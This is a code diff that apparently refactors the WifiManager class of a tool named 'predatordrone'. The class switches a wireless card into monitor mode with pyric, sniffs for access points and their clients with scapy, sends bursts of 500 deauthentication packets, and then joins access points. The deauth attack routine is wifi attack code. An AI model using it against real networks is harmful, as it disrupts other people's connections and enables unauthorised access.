@@ -5,22 +5,12 @@
 
 from predatordrone.external_exec import do
 import predatordrone.disp as disp
+
 from scapy.all import *
 
-
-
-# ===============
-#    Constants
-# ===============
-
-ip_prog   = "ip"
-iw_prog   = "iw"
-ifconfig  = "ifconfig"
-iwconfig  = "iwconfig"
-airmon    = "airmon-ng"
-aireplay  = "aireplay-ng"
-dhclient  = "dhclient"
-
+import pyric.pyw as pyw
+import pyric
+import time
 
 
 
@@ -72,37 +62,53 @@ class WifiManager:
     WIFI_CHAN_MAX = 13
 
 
-    def __init__(self, interface, physical_interface):
-        self.iface = interface
-        self.phy   = physical_interface
-
+    def __init__(self, iface):
         self.detected_aps = []
-        self.parrot_aps   = []
+        self.iface        = iface.replace("mon", "")
+
+        # Check interface is wireless
+        if not pyw.iswireless(iface):
+            disp.die(iface, "is not a wireless interface!\n",
+                    "   Available interfaces: ", pyw.winterfaces())
+
+        # Register carde
+        self.card = pyw.getcard(iface)
+
+        # Check if card supports monitor mode
+        if 'monitor' not in pyw.devmodes(self.card):
+            disp.die(iface_name, "does not support monitor mode!")
 
 
 
-    # ============================
-    #    Device mode management
-    # ============================
+    # =======================
+    #    Device management
+    # =======================
+
+    def __set_channel(self, channel):
+        pyw.chset(self.card, channel)
+
+    def __check_mode(self, mode):
+        return pyw.devinfo(self.card)['mode'] == mode
 
     def __set_mode_managed(self):
-        disp.debug("Switching adapter to managed mode")
-        do(ip_prog, "link set", self.iface, "down")
-        do(iw_prog, self.iface, "del")
-
-        self.iface = self.iface.replace("mon", "")
-        do(iw_prog, self.phy, "interface add", self.iface, "type managed")
-        do(ip_prog, "link set", self.iface, "up")
-
+        self.__set_mode("managed")
 
     def __set_mode_monitor(self):
-        disp.debug("Switching adapter to monitor mode")
-        do(ip_prog, "link set", self.iface, "down")
-        do(iw_prog, self.iface, "del")
+        self.__set_mode("monitor")
 
-        self.iface = self.iface + "mon"
-        do(iw_prog, self.phy, "interface add", self.iface, "type monitor")
-        do(ip_prog, "link set", self.iface, "up")
+
+    def __set_mode(self, mode):
+        disp.debug("Switching adapter to", mode, "mode")
+
+        if self.__check_mode(mode):
+            disp.warn("Wireless card already in", mode, "mode!")
+        else:
+            iface = self.iface + ("mon" if mode == "monitor" else "")
+            card  = pyw.devadd(self.card, iface, mode)
+            pyw.devdel(self.card)
+
+            self.card = card
+            pyw.up(self.card)
 
 
 
@@ -140,8 +146,8 @@ class WifiManager:
 
         disp.info("Searching for new running APs")
         for chan in range(self.WIFI_CHAN_MIN, self.WIFI_CHAN_MAX + 1):
-            do(iw_prog, "dev", self.iface, "set channel", str(chan))
-            sniff(iface=self.iface, timeout=0.1, lfilter=self.__f_beacon_probe_resp,
+            self.__set_channel(chan)
+            sniff(iface=self.card.dev, timeout=0.1, lfilter=self.__f_beacon_probe_resp,
                     prn=self.__add_access_point)
 
         self.__set_mode_managed()
@@ -197,8 +203,8 @@ class WifiManager:
         : param reg_client  A callback called when a client is found
         """
         self.__set_mode_monitor()
-        do("iw dev", self.iface, "set channel", str(ap.chan))
-        sniff(iface=self.iface,
+        self.__set_channel(ap.chan)
+        sniff(iface=self.card.dev,
                 lfilter=lambda p: self.__f_bssid_clients(ap.bssid,   p),
                 prn    =lambda p: self.__add_ssid_client(reg_client, p),
                 timeout=1)
@@ -218,16 +224,25 @@ class WifiManager:
 
         # Send packets
         self.__set_mode_monitor()
-        do("iw dev", self.iface, "set channel", str(ap.chan))
-        sendp(deauth_pkt, iface=self.iface, count=500, verbose=disp.Verb.isdebug())
+        self.__set_channel(ap.chan)
+        sendp(deauth_pkt, iface=self.card.dev, count=500, verbose=disp.Verb.isdebug())
         self.__set_mode_managed()
 
 
-    def connect_access_point(self, ap):
-        do("while [ \"$(", iw_prog, self.iface, "link)\" = \"Not connected.\" ]; do",
-                iw_prog, self.iface, "connect", ap.ssid, "; sleep 0.1; done")
+    def connect_access_point(self, ap, force=True):
+        while not pyw.isconnected(self.card):
+            try:
+                pyw.connect(self.card, ap.ssid.encode(), bssid=ap.bssid)
+                time.sleep(0.1)
+            except pyric.error:
+                pass
 
 
     def acquire_ip(self):
-        do(dhclient, "-r")
-        do(dhclient, "-v", self.iface)
+        if not pyw.isconnected(self.card):
+            disp.error("Can't acquire IP using DHCP: wireless card not connected to AP!")
+            return False
+        else:
+            do("dhclient -r")
+            do("dhclient -v", self.card.dev)
+            return True
